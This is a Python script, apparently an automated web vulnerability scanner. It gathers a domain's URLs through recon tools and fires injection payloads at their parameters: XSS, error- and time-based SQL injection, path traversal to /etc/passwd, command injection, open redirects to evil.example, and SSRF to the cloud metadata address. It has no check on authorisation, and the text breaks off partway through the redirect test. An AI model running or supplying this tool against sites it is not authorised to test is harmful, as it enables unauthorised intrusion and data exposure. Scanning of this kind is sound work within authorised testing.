#!/usr/bin/env python3
from __future__ import annotations

import argparse
import concurrent.futures
import csv
import html
import json
import os
import random
import re
import shutil
import string
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Sequence, Set, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

import requests


def log(msg: str) -> None:
    print(f"[+] {msg}", flush=True)


def warn(msg: str) -> None:
    print(f"[!] {msg}", flush=True)


def err(msg: str) -> None:
    print(f"[-] {msg}", file=sys.stderr, flush=True)


def run(cmd: List[str], timeout: int = 600) -> Tuple[int, str, str]:
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except FileNotFoundError:
        return 127, "", "not found"
    except Exception as e:
        return 1, "", str(e)


def in_path(exe: str) -> Optional[str]:
    return shutil.which(exe)


def ensure_path_dir(path_dir: Optional[str]) -> None:
    if path_dir and path_dir not in os.environ.get("PATH", ""):
        os.environ["PATH"] = f"{path_dir}:{os.environ.get('PATH','')}"


def go_env_paths() -> Tuple[Optional[str], Optional[str]]:
    rc, out, _ = run(["go", "env", "GOBIN"])
    gobin = out.strip() if rc == 0 and out.strip() else None
    rc, out, _ = run(["go", "env", "GOPATH"])
    gopath_bin = str(Path(out.strip()) / "bin") if rc == 0 and out.strip() else None
    return gobin, gopath_bin


def user_base_bin() -> Optional[str]:
    rc, out, _ = run([sys.executable, "-m", "site", "--user-base"])
    base = out.strip() if rc == 0 else None
    if base:
        return str(Path(base) / ("Scripts" if os.name == "nt" else "bin"))
    return None


def try_go_install(module: str) -> bool:
    rc, _, errout = run(["go", "install", f"{module}@latest"])
    if rc != 0:
        warn(f"go install {module}@latest failed: {errout.strip()[:200]}")
        return False
    gobin, gopath_bin = go_env_paths()
    ensure_path_dir(gobin)
    ensure_path_dir(gopath_bin)
    return True


def try_pipx_install(pkg: str) -> bool:
    if not in_path("pipx"):
        return False
    rc, out, errout = run(["pipx", "install", pkg])
    if rc != 0 and "already installed" not in (out + errout).lower():
        warn(f"pipx install {pkg} failed: {errout.strip()[:200]}")
        return False
    ensure_path_dir(os.path.expanduser("~/.local/bin"))
    return True


def try_pip_user_install(pkg: str) -> bool:
    rc, out, errout = run([sys.executable, "-m", "pip", "install", "--user", pkg])
    if rc != 0:
        warn(f"pip --user install {pkg} failed: {errout.strip()[:200]}")
        return False
    ensure_path_dir(user_base_bin())
    return True


def ensure_gf_patterns() -> None:
    gf_dir = Path(os.path.expanduser("~/.gf"))
    if any(gf_dir.glob("*.json")):
        return
    if not in_path("git"):
        warn("Git not found; cannot fetch gf patterns automatically.")
        return
    gf_dir.parent.mkdir(parents=True, exist_ok=True)
    rc, _, errout = run(["git", "clone", "--depth", "1", "https://github.com/1ndianl33t/Gf-Patterns", str(gf_dir)])
    if rc != 0:
        warn(f"Fetching gf patterns failed: {errout.strip()[:200]}")


def auto_install_tools(enable: bool = True) -> Dict[str, bool]:
    status = {
        "go": bool(in_path("go")),
        "pipx": bool(in_path("pipx")),
        "pip": True,
        "git": bool(in_path("git")),
        "waybackurls": bool(in_path("waybackurls")),
        "paramspider": bool(in_path("paramspider")),
        "gf": bool(in_path("gf")),
        "kxss": bool(in_path("kxss")),
    }
    if not enable:
        return {k: status[k] for k in ["waybackurls", "paramspider", "gf", "kxss"]}
    if not status["waybackurls"] and status["go"]:
        log("Installing waybackurls")
        if try_go_install("github.com/tomnomnom/waybackurls"):
            status["waybackurls"] = bool(in_path("waybackurls"))
    if not status["gf"] and status["go"]:
        log("Installing gf")
        if try_go_install("github.com/tomnomnom/gf"):
            status["gf"] = bool(in_path("gf"))
    ensure_gf_patterns()
    if not status["kxss"] and status["go"]:
        log("Installing kxss")
        if try_go_install("github.com/tomnomnom/hacks/kxss"):
            status["kxss"] = bool(in_path("kxss"))
    if not status["paramspider"]:
        log("Installing ParamSpider")
        ok = try_pipx_install("paramspider") or try_pip_user_install("paramspider")
        status["paramspider"] = ok or bool(in_path("paramspider")) or (user_base_bin() and Path(user_base_bin(), "paramspider").exists())
        if not status["paramspider"]:
            warn("ParamSpider auto-install failed.")
    return {k: status[k] for k in ["waybackurls", "paramspider", "gf", "kxss"]}


def get_gf_patterns() -> Set[str]:
    try:
        out = subprocess.check_output(["gf", "-list"], stderr=subprocess.DEVNULL, text=True, timeout=5)
        return set(line.strip() for line in out.splitlines() if line.strip())
    except Exception:
        patterns = set()
        gf_home = os.path.expanduser("~/.gf")
        if os.path.isdir(gf_home):
            for f in os.listdir(gf_home):
                if f.endswith(".json"):
                    patterns.add(f[:-5])
        return patterns


def resolve_gf_name(candidates: Iterable[str], available: Set[str]) -> Optional[str]:
    for c in candidates:
        if c in available:
            return c
    return None


def run_waybackurls(domain: str) -> Set[str]:
    urls: Set[str] = set()
    try:
        p = subprocess.run(["waybackurls", domain], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
        for line in p.stdout.splitlines():
            s = line.strip()
            if s:
                urls.add(s)
    except FileNotFoundError:
        warn("waybackurls not found.")
    return urls


def run_paramspider(domain: str, outfile: Path, include_subs: bool, extra_args: str) -> Set[str]:
    urls: Set[str] = set()
    cmd = ["paramspider", "-d", domain, "-o", str(outfile)]
    if include_subs:
        cmd.append("--subs")
    cmd += ["--exclude", "png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,eot,css,mp4,mp3", "--suppress"]
    if extra_args:
        cmd += extra_args.split()
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
        if outfile.exists():
            for line in outfile.read_text(encoding="utf-8", errors="ignore").splitlines():
                s = line.strip()
                if s:
                    urls.add(s)
        else:
            for line in p.stdout.splitlines():
                s = line.strip()
                if s:
                    urls.add(s)
    except FileNotFoundError:
        warn("paramspider not found.")
    return urls


def only_urls_with_params(urls: Iterable[str]) -> Set[str]:
    return {u for u in urls if "?" in u and not u.endswith("?")}


def save_lines(path: Path, lines: Iterable[str]) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    seen, out = set(), []
    for l in lines:
        if l not in seen:
            seen.add(l)
            out.append(l)
    path.write_text("\n".join(out) + ("\n" if out else ""), encoding="utf-8")
    return len(out)


JS_URL_RE = re.compile(r"""https?://[^\s'"<>()]+""", re.IGNORECASE)
REL_ENDPOINT_RE = re.compile(r"""(?<![A-Za-z0-9])(?:/|\\?/)(?:[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]{3,})""")
PARAM_KEY_RE = re.compile(r"""(?<![A-Za-z0-9_])([A-Za-z_][A-Za-z0-9_\-]{0,50})(?==)""")


def fetch_js(url: str, timeout: int, ua: str) -> Tuple[str, Optional[str]]:
    headers = {"User-Agent": ua, "Accept": "*/*"}
    try:
        r = requests.get(url, timeout=timeout, headers=headers, allow_redirects=True)
        ct = r.headers.get("content-type", "")
        if r.status_code == 200 and ("javascript" in ct or url.lower().endswith(".js") or len(r.text) > 0):
            return url, r.text
    except Exception:
        return url, None
    return url, None


def analyze_js(js_text: str) -> Tuple[Set[str], Set[str]]:
    urls: Set[str] = set(JS_URL_RE.findall(js_text))
    rels: Set[str] = set(REL_ENDPOINT_RE.findall(js_text))
    keys: Set[str] = set(PARAM_KEY_RE.findall(js_text))
    return urls.union(rels), keys


def collect_js(endpoints: Iterable[str], threads: int, timeout: int, ua: str) -> Tuple[Set[str], Set[str]]:
    js_candidates = {u for u in endpoints if ".js" in u.lower() or u.lower().endswith(".map")}
    if not js_candidates:
        return set(), set()
    log(f"Downloading {len(js_candidates)} JavaScript files")
    urls_out, keys_out = set(), set()
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(32, max(4, len(js_candidates) // 3 or 4))) as ex:
        for url, content in ex.map(lambda u: fetch_js(u, timeout, ua), js_candidates):
            if content:
                u2, k2 = analyze_js(content)
                urls_out |= u2
                keys_out |= k2
    return urls_out, keys_out


def run_kxss(urls_with_params: Iterable[str]) -> Set[str]:
    try:
        p = subprocess.run(["kxss"], input="\n".join(urls_with_params), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
        return set(s.strip() for s in p.stdout.splitlines() if s.strip())
    except FileNotFoundError:
        warn("kxss not found.")
        return set()


def run_gf(pattern: Optional[str], urls_input: Iterable[str]) -> Set[str]:
    if not pattern:
        return set()
    try:
        p = subprocess.run(["gf", pattern], input="\n".join(urls_input), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
        return set(s.strip() for s in p.stdout.splitlines() if s.strip())
    except FileNotFoundError:
        warn("gf not found.")
        return set()


def get_gf_pattern_map() -> Dict[str, Optional[str]]:
    avail = get_gf_patterns()
    def pick(names: List[str]) -> Optional[str]:
        for n in names:
            if n in avail:
                return n
        return None
    return {
        "xss": pick(["xss"]),
        "sqli": pick(["sqli", "sql-injection", "sql"]),
        "ssrf": pick(["ssrf"]),
        "lfi": pick(["lfi", "file-read", "path-traversal"]),
        "rce": pick(["rce", "command-injection", "code-exec"]),
        "redirect": pick(["redirect", "open-redirect", "openredirect"]),
    }


@dataclass
class Payloads:
    xss: List[str]
    sqli_err: List[str]
    sqli_t5: List[str]
    sqli_t7: List[str]
    lfi: List[str]
    rce_echo: List[str]
    rce_t5: List[str]
    rce_t7: List[str]
    redirect: List[str]
    ssrf: List[str]


def read_lines_file(path: Path, name: str) -> List[str]:
    if not path.exists():
        return []
    out: List[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        s = line.strip()
        if s and not s.startswith("#"):
            out.append(s)
    return out


def read_payload_file(path: Path, default: List[str], name: str) -> List[str]:
    lines = read_lines_file(path, name)
    if lines:
        log(f"Loaded {len(lines)} payloads from {name}")
        return lines
    warn(f"{name} missing or empty; using defaults")
    return default


def load_payloads(payload_dir: Path) -> Payloads:
    XSS_DEF = ["<svg/onload=alert('{X}')>", "\"><img src=x onerror=alert('{X}')>"]
    SQLI_ERR_DEF = ["'\"`)(", "' AND '1'='2", "1 OR 1=2"]
    SQLI_T5_DEF = ["' OR SLEEP(5)-- -", "'));SELECT pg_sleep(5);--"]
    SQLI_T7_DEF = ["' OR SLEEP(7)-- -", "'));SELECT pg_sleep(7);--"]
    LFI_DEF = ["../../../../../../../../etc/passwd", "..%2f..%2fetc%2fpasswd", "..\\..\\..\\..\\Windows\\win.ini"]
    RCE_ECHO_DEF = [";echo {X}", "&& echo {X}", "| echo {X}"]
    RCE_T5_DEF = [";sleep 5", "&& sleep 5", "| sleep 5"]
    RCE_T7_DEF = [";sleep 7", "&& sleep 7", "| sleep 7"]
    REDIR_DEF = ["https://evil.example/{X}", "//evil.example/{X}"]
    SSRF_DEF = ["http://127.0.0.1/{X}", "http://169.254.169.254/latest/meta-data/{X}"]
    return Payloads(
        xss=read_payload_file(payload_dir / "xsspayload.txt", XSS_DEF, "xsspayload.txt"),
        sqli_err=read_payload_file(payload_dir / "sqlipayload_error.txt", SQLI_ERR_DEF, "sqlipayload_error.txt"),
        sqli_t5=read_payload_file(payload_dir / "sqlipayload_time_5.txt", SQLI_T5_DEF, "sqlipayload_time_5.txt"),
        sqli_t7=read_payload_file(payload_dir / "sqlipayload_time_7.txt", SQLI_T7_DEF, "sqlipayload_time_7.txt"),
        lfi=read_payload_file(payload_dir / "lfipayload.txt", LFI_DEF, "lfipayload.txt"),
        rce_echo=read_payload_file(payload_dir / "rcepayload_echo.txt", RCE_ECHO_DEF, "rcepayload_echo.txt"),
        rce_t5=read_payload_file(payload_dir / "rcepayload_time_5.txt", RCE_T5_DEF, "rcepayload_time_5.txt"),
        rce_t7=read_payload_file(payload_dir / "rcepayload_time_7.txt", RCE_T7_DEF, "rcepayload_time_7.txt"),
        redirect=read_payload_file(payload_dir / "redirectpayload.txt", REDIR_DEF, "redirectpayload.txt"),
        ssrf=read_payload_file(payload_dir / "ssrfpayload.txt", SSRF_DEF, "ssrfpayload.txt"),
    )


@dataclass
class BodyKeys:
    form_keys: List[str]
    json_keys: List[str]


def load_bodykeys(payload_dir: Path) -> BodyKeys:
    bk = read_lines_file(payload_dir / "bodykeys.txt", "bodykeys.txt")
    jk = read_lines_file(payload_dir / "jsonkeys.txt", "jsonkeys.txt")
    if not bk:
        warn("bodykeys.txt missing or empty; POST will be skipped")
    if not jk:
        warn("jsonkeys.txt missing or empty; JSON will be skipped")
    return BodyKeys(form_keys=bk, json_keys=jk)


DEFAULT_TIMEOUT = 15
TIME_DELTA_SEC_PRIMARY = 4.0
MAX_BODY_LEN = 2_000_000


@dataclass
class TestConfig:
    cookie: Optional[str]
    threads: int
    timeout: int
    insecure: bool
    ua: str
    oast_url: Optional[str] = None
    methods: Set[str] = None


def rand_token(prefix: str) -> str:
    s = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}{s}"


def build_headers(cfg: TestConfig, extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    h = {"User-Agent": cfg.ua, "Accept": "*/*"}
    if cfg.cookie:
        h["Cookie"] = cfg.cookie
    if extra:
        h.update(extra)
    return h


def send_get(url: str, headers: Dict[str, str], timeout: int, allow_redirects: bool, verify_tls: bool):
    t0 = time.time()
    try:
        r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=allow_redirects, verify=verify_tls)
        return r.status_code, {k.lower(): v for k, v in r.headers.items()}, r.text if r.text else "", time.time() - t0
    except requests.RequestException as e:
        return 0, {}, str(e), time.time() - t0


def send_post_form(url: str, data: Dict[str, str], headers: Dict[str, str], timeout: int, allow_redirects: bool, verify_tls: bool):
    t0 = time.time()
    try:
        r = requests.post(url, data=data, headers=headers, timeout=timeout, allow_redirects=allow_redirects, verify=verify_tls)
        return r.status_code, {k.lower(): v for k, v in r.headers.items()}, r.text if r.text else "", time.time() - t0
    except requests.RequestException as e:
        return 0, {}, str(e), time.time() - t0


def send_post_json(url: str, data: Dict[str, object], headers: Dict[str, str], timeout: int, allow_redirects: bool, verify_tls: bool):
    t0 = time.time()
    try:
        r = requests.post(url, json=data, headers=headers, timeout=timeout, allow_redirects=allow_redirects, verify=verify_tls)
        return r.status_code, {k.lower(): v for k, v in r.headers.items()}, r.text if r.text else "", time.time() - t0
    except requests.RequestException as e:
        return 0, {}, str(e), time.time() - t0


def baseline_get(url: str, cfg: TestConfig) -> float:
    s, hdr, body, t = send_get(url, build_headers(cfg), cfg.timeout, True, not cfg.insecure)
    return t


def baseline_post(url: str, form: Dict[str, str], cfg: TestConfig) -> float:
    s, hdr, body, t = send_post_form(url, form, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
    return t


def baseline_json(url: str, data: Dict[str, object], cfg: TestConfig) -> float:
    s, hdr, body, t = send_post_json(url, data, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
    return t


def token_in_body(body: str, token: str) -> bool:
    if not body:
        return False
    return token.lower() in body.lower()


def evidence_snippet(body: str, token: str, radius: int = 60) -> str:
    i = body.lower().find(token.lower())
    if i == -1:
        return ""
    start = max(0, i - radius)
    end = min(len(body), i + len(token) + radius)
    return body[start:end].replace("\n", " ")[:200]


def has_sql_error(body: str) -> bool:
    b = (body or "").lower()
    sigs = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "pg_query():",
        "syntax error at or near",
        "oracle error",
        "sqlite error",
    ]
    return any(sig in b for sig in sigs)


def confirm_time_delay_get(url: str, param: str, p5: str, p7: str, cfg: TestConfig, base_time: float) -> bool:
    u5 = mutate_url_param(url, param, p5)
    s5, _, _, t5 = send_get(u5, build_headers(cfg), cfg.timeout, True, not cfg.insecure)
    if t5 - base_time < TIME_DELTA_SEC_PRIMARY:
        return False
    u7 = mutate_url_param(url, param, p7)
    s7, _, _, t7 = send_get(u7, build_headers(cfg), cfg.timeout + 3, True, not cfg.insecure)
    return (t7 - t5) > 1.0


def confirm_time_delay_post(url: str, key: str, p5: str, p7: str, cfg: TestConfig, base_form: Dict[str, str], base_time: float) -> bool:
    d5 = dict(base_form)
    d5[key] = p5
    s5, _, _, t5 = send_post_form(url, d5, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
    if t5 - base_time < TIME_DELTA_SEC_PRIMARY:
        return False
    d7 = dict(base_form)
    d7[key] = p7
    s7, _, _, t7 = send_post_form(url, d7, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout + 3, True, not cfg.insecure)
    return (t7 - t5) > 1.0


def confirm_time_delay_json(url: str, key: str, p5: str, p7: str, cfg: TestConfig, base_json: Dict[str, object], base_time: float) -> bool:
    j5 = dict(base_json)
    j5[key] = p5
    s5, _, _, t5 = send_post_json(url, j5, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
    if t5 - base_time < TIME_DELTA_SEC_PRIMARY:
        return False
    j7 = dict(base_json)
    j7[key] = p7
    s7, _, _, t7 = send_post_json(url, j7, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout + 3, True, not cfg.insecure)
    return (t7 - t5) > 1.0


def parse_kxss_hint(url_or_line: str) -> Tuple[str, Optional[str]]:
    m = re.search(r"\[(.+?)\]\s*$", url_or_line)
    if m:
        return url_or_line[: url_or_line.rfind("[")].strip(), m.group(1).strip()
    return url_or_line.strip(), None


def mutate_url_param(url: str, param: str, value: str) -> str:
    pr = urlparse(url)
    q = parse_qsl(pr.query, keep_blank_values=True)
    newq = [(k, (value if k == param else v)) for k, v in q]
    return urlunparse(pr._replace(query=urlencode(newq, doseq=True)))


def choose_params(url: str, hint: Optional[str]) -> List[str]:
    q = parse_qsl(urlparse(url).query, keep_blank_values=True)
    keys = [k for k, _ in q]
    if hint and hint in keys:
        return [hint]
    return sorted(set(keys))


def iter_candidates(file_path: Path) -> List[Tuple[str, Optional[str]]]:
    items: List[Tuple[str, Optional[str]]] = []
    if not file_path.exists():
        return items
    for line in file_path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if not line:
            continue
        url, hint = parse_kxss_hint(line)
        items.append((url, hint))
    return items


def write_findings_csv(path: Path, rows: List[Dict[str, str]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["url", "param", "payload", "evidence", "evidence_type", "rt_delta_ms"])
        w.writeheader()
        for r in rows:
            w.writerow(r)


def process_domain_enum(domain: str, base_out: Path, threads: int, timeout: int, max_urls: int, enable_wayback: bool, enable_paramspider: bool, enable_js: bool, include_subs: bool, paramspider_args: str, ua: str) -> Dict[str, int]:
    out_dir = base_out / domain
    out_dir.mkdir(parents=True, exist_ok=True)
    combined: Set[str] = set()
    if enable_wayback and in_path("waybackurls"):
        log(f"[{domain}] waybackurls")
        combined |= run_waybackurls(domain)
    elif enable_wayback:
        warn("waybackurls missing; skipped")
    if enable_paramspider and (in_path("paramspider") or (user_base_bin() and Path(user_base_bin(), "paramspider").exists())):
        log(f"[{domain}] ParamSpider")
        combined |= run_paramspider(domain, out_dir / "paramspider_raw.txt", include_subs, paramspider_args)
    elif enable_paramspider:
        warn("paramspider missing; skipped")
    endpoints = sorted(combined)[:max_urls]
    counts: Dict[str, int] = {}
    counts["endpoints"] = save_lines(out_dir / "endpoints.txt", endpoints)
    with_params = sorted(only_urls_with_params(endpoints))
    counts["with_params"] = save_lines(out_dir / "endpoints_with_params.txt", with_params)
    if enable_js:
        log(f"[{domain}] JS analysis")
        js_urls_found, js_params_found = collect_js(endpoints, threads, timeout, ua)
        counts["js_urls"] = save_lines(out_dir / "js_urls.txt", sorted(js_urls_found))
        counts["js_params"] = save_lines(out_dir / "js_params.txt", sorted(js_params_found))
    gfmap = get_gf_pattern_map()
    log(f"[{domain}] kxss + gf over {len(with_params)} URLs with params")
    kxss_res = run_kxss(with_params)
    gf_xss_res = run_gf(gfmap["xss"], with_params)
    gf_sqli_res = run_gf(gfmap["sqli"], with_params)
    gf_ssrf_res = run_gf(gfmap["ssrf"], with_params)
    gf_lfi_res = run_gf(gfmap["lfi"], with_params)
    gf_rce_res = run_gf(gfmap["rce"], with_params)
    gf_redir_res = run_gf(gfmap["redirect"], with_params)
    counts["xsstest"] = save_lines(out_dir / "xsstest.txt", sorted(kxss_res | gf_xss_res))
    counts["sqlitest"] = save_lines(out_dir / "sqlitest.txt", sorted(gf_sqli_res))
    counts["ssrftest"] = save_lines(out_dir / "ssrftest.txt", sorted(gf_ssrf_res))
    counts["lfitest"] = save_lines(out_dir / "lfitest.txt", sorted(gf_lfi_res))
    counts["rcetest"] = save_lines(out_dir / "rcetest.txt", sorted(gf_rce_res))
    counts["redirecttest"] = save_lines(out_dir / "redirecttest.txt", sorted(gf_redir_res))
    (out_dir / "tooling_report.json").write_text(json.dumps({"domain": domain, "tools": {"waybackurls": bool(in_path("waybackurls")), "paramspider": bool(in_path("paramspider")) or (user_base_bin() and Path(user_base_bin(), "paramspider").exists()), "gf": bool(in_path("gf")), "kxss": bool(in_path("kxss"))}, "gf_patterns_used": gfmap, "counts": counts}, indent=2), encoding="utf-8")
    return counts


def test_xss(domain_dir: Path, cfg: TestConfig, payloads: Payloads, bkeys: BodyKeys) -> None:
    items = iter_candidates(domain_dir / "xsstest.txt")
    rows: List[Dict[str, str]] = []
    if "GET" in cfg.methods:
        for url, hint in items:
            params = choose_params(url, hint)
            for p in params:
                found = False
                for tpl in payloads.xss:
                    t1, t2 = rand_token("x"), rand_token("y")
                    pay1, pay2 = tpl.replace("{X}", t1), tpl.replace("{X}", t2)
                    s1, h1, b1, _ = send_get(mutate_url_param(url, p, pay1), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                    if s1 and token_in_body(b1, pay1):
                        s2, h2, b2, _ = send_get(mutate_url_param(url, p, pay2), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                        if s2 and token_in_body(b2, pay2):
                            rows.append({"url": url, "param": p, "payload": pay2, "evidence": evidence_snippet(b2, pay2), "evidence_type": "html-reflection", "rt_delta_ms": "0"})
                            log(f"[XSS][GET] {url} [{p}] payload={pay2}")
                            found = True
                            break
                if found:
                    continue
    if "POST" in cfg.methods and bkeys.form_keys:
        for url, _ in items:
            base = {k: "test" for k in bkeys.form_keys}
            for key in bkeys.form_keys:
                for tpl in payloads.xss:
                    t1, t2 = rand_token("x"), rand_token("y")
                    pay1, pay2 = tpl.replace("{X}", t1), tpl.replace("{X}", t2)
                    d1 = dict(base)
                    d1[key] = pay1
                    s1, h1, b1, _ = send_post_form(url, d1, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                    if s1 and token_in_body(b1, pay1):
                        d2 = dict(base)
                        d2[key] = pay2
                        s2, h2, b2, _ = send_post_form(url, d2, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                        if s2 and token_in_body(b2, pay2):
                            rows.append({"url": url, "param": key, "payload": f"POST {key}={pay2}", "evidence": evidence_snippet(b2, pay2), "evidence_type": "html-reflection", "rt_delta_ms": "0"})
                            log(f"[XSS][POST] {url} [{key}] payload={pay2}")
                            break
    if "JSON" in cfg.methods and bkeys.json_keys:
        for url, _ in items:
            base = {k: "test" for k in bkeys.json_keys}
            for key in bkeys.json_keys:
                for tpl in payloads.xss:
                    t1, t2 = rand_token("x"), rand_token("y")
                    pay1, pay2 = tpl.replace("{X}", t1), tpl.replace("{X}", t2)
                    j1 = dict(base)
                    j1[key] = pay1
                    s1, h1, b1, _ = send_post_json(url, j1, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                    if s1 and token_in_body(b1, pay1):
                        j2 = dict(base)
                        j2[key] = pay2
                        s2, h2, b2, _ = send_post_json(url, j2, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                        if s2 and token_in_body(b2, pay2):
                            rows.append({"url": url, "param": key, "payload": f"JSON {key}={pay2}", "evidence": evidence_snippet(b2, pay2), "evidence_type": "html-reflection", "rt_delta_ms": "0"})
                            log(f"[XSS][JSON] {url} [{key}] payload={pay2}")
                            break
    write_findings_csv(domain_dir / "findings/xss.csv", rows)


def test_sqli(domain_dir: Path, cfg: TestConfig, payloads: Payloads, bkeys: BodyKeys) -> None:
    items = iter_candidates(domain_dir / "sqlitest.txt")
    rows: List[Dict[str, str]] = []
    if "GET" in cfg.methods:
        for url, hint in items:
            t0 = baseline_get(url, cfg)
            params = choose_params(url, hint)
            for p in params:
                found = False
                for pe in payloads.sqli_err:
                    s, h, b, _ = send_get(mutate_url_param(url, p, pe), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                    if has_sql_error(b):
                        rows.append({"url": url, "param": p, "payload": pe, "evidence": "db-error", "evidence_type": "error-based", "rt_delta_ms": "0"})
                        log(f"[SQLi][GET] {url} [{p}] payload={pe}")
                        found = True
                        break
                if found:
                    continue
                for p5, p7 in zip(payloads.sqli_t5, payloads.sqli_t7):
                    if confirm_time_delay_get(url, p, p5, p7, cfg, t0):
                        rows.append({"url": url, "param": p, "payload": f"{p5} -> {p7}", "evidence": "time-delay", "evidence_type": "time-based", "rt_delta_ms": "~5000-7000"})
                        log(f"[SQLi][GET] {url} [{p}] payloads=({p5} | {p7})")
                        break
    if "POST" in cfg.methods and bkeys.form_keys:
        for url, _ in items:
            base = {k: "1" for k in bkeys.form_keys}
            t0 = baseline_post(url, base, cfg)
            for key in bkeys.form_keys:
                found = False
                for pe in payloads.sqli_err:
                    d = dict(base)
                    d[key] = pe
                    s, h, b, _ = send_post_form(url, d, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                    if has_sql_error(b):
                        rows.append({"url": url, "param": key, "payload": f"POST {key}={pe}", "evidence": "db-error", "evidence_type": "error-based", "rt_delta_ms": "0"})
                        log(f"[SQLi][POST] {url} [{key}] payload={pe}")
                        found = True
                        break
                if found:
                    continue
                for p5, p7 in zip(payloads.sqli_t5, payloads.sqli_t7):
                    if confirm_time_delay_post(url, key, p5, p7, cfg, base, t0):
                        rows.append({"url": url, "param": key, "payload": f"POST {key}: {p5} -> {p7}", "evidence": "time-delay", "evidence_type": "time-based", "rt_delta_ms": "~5000-7000"})
                        log(f"[SQLi][POST] {url} [{key}] payloads=({p5} | {p7})")
                        break
    if "JSON" in cfg.methods and bkeys.json_keys:
        for url, _ in items:
            base = {k: "1" for k in bkeys.json_keys}
            t0 = baseline_json(url, base, cfg)
            for key in bkeys.json_keys:
                found = False
                for pe in payloads.sqli_err:
                    j = dict(base)
                    j[key] = pe
                    s, h, b, _ = send_post_json(url, j, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                    if has_sql_error(b):
                        rows.append({"url": url, "param": key, "payload": f"JSON {key}={pe}", "evidence": "db-error", "evidence_type": "error-based", "rt_delta_ms": "0"})
                        log(f"[SQLi][JSON] {url} [{key}] payload={pe}")
                        found = True
                        break
                if found:
                    continue
                for p5, p7 in zip(payloads.sqli_t5, payloads.sqli_t7):
                    if confirm_time_delay_json(url, key, p5, p7, cfg, base, t0):
                        rows.append({"url": url, "param": key, "payload": f"JSON {key}: {p5} -> {p7}", "evidence": "time-delay", "evidence_type": "time-based", "rt_delta_ms": "~5000-7000"})
                        log(f"[SQLi][JSON] {url} [{key}] payloads=({p5} | {p7})")
                        break
    write_findings_csv(domain_dir / "findings/sqli.csv", rows)


def test_redirect(domain_dir: Path, cfg: TestConfig, payloads: Payloads, bkeys: BodyKeys) -> None:
    items = iter_candidates(domain_dir / "redirecttest.txt")
    rows: List[Dict[str, str]] = []
    if "GET" in cfg.methods:
        for url, hint in items:
            params = choose_params(url, hint)
            for p in params:
                if not payloads.redirect:
                    break
                if len(payloads.redirect) == 1:
                    t1 = payloads.redirect[0].replace("{X}", rand_token("r1"))
                    t2 = payloads.redirect[0].replace("{X}", rand_token("r2"))
                else:
                    t1 = payloads.redirect[0].replace("{X}", rand_token("r1"))
                    t2 = payloads.redirect[1].replace("{X}", rand_token("r2"))
                s1, h1, b1, _ = send_get(mutate_url_param(url, p, t1), build_headers(cfg), cfg.timeout, False, not cfg.insecure)
                loc1 = h1.get("location")
                if (300 <= s1 < 400 and loc1) and (urlparse(loc1).netloc != urlparse(url).netloc):
                    s2, h2, b2, _ = send_get(mutate_url_param(url, p, t2), build_headers(cfg), cfg.timeout, False, not cfg.insecure)
                    loc2 = h2.get("location")
                    if (300 <= s2 < 400 and loc2) and (urlparse(loc2).netloc != urlparse(url).netloc):
                        rows.append({"url": url, "param": p, "payload": f"{t1} | {t2}", "evidence": f"{loc1} -> {loc2}", "evidence_type": "location-3xx", "rt_delta_ms": "0"})
                        log(f"[Redirect][GET] {url} [{p}] payloads=({t1} | {t2})")
    if "POST" in cfg.methods and bkeys.form_keys:
        for url, _ in items:
            for key in bkeys.form_keys:
                if not payloads.redirect:
                    break
                if len(payloads.redirect) == 1:
                    t1 = payloads.redirect[0].replace("{X}", rand_token("r1"))
                    t2 = payloads.redirect[0].replace("{X}", rand_token("r2"))
                else:
                    t1 = payloads.redirect[0].replace("{X}", rand_token("r1"))
                    t2 = payloads.redirect[1].replace("{X}", rand_token("r2"))
                d1 = {k: "x" for k in bkeys.form_keys}
                d1[key] = t1
                s1, h1, b1, _ = send_post_form(url, d1, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, False, not cfg.insecure)
                loc1 = h1.get("location")
                if (300 <= s1 < 400 and loc1) and (urlparse(loc1).netloc != urlparse(url).netloc):
                    d2 = {k: "x" for k in bkeys.form_keys}
